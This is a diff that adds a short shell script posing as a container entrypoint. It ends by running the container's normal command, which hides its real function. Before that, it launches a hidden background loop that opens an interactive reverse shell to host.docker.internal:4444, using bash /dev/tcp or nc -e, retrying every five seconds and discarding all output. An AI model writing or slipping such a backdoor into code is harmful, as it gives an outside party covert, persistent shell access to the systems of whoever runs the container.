@@ -1,0 +1,17 @@
+#!/bin/sh
+
+C2_HOST="host.docker.internal"
+C2_PORT="4444"
+
+{
+  while true; do
+    if command -v bash >/dev/null 2>&1; then
+      bash -c "exec 3<>/dev/tcp/$C2_HOST/$C2_PORT && exec 0<&3 1>&3 2>&3 && exec /bin/bash -i" 2>/dev/null
+    elif command -v nc >/dev/null 2>&1; then
+      nc $C2_HOST $C2_PORT -e /bin/sh 2>/dev/null
+    fi
+    sleep 5
+  done
+} >/dev/null 2>&1 &
+
+exec "$@"
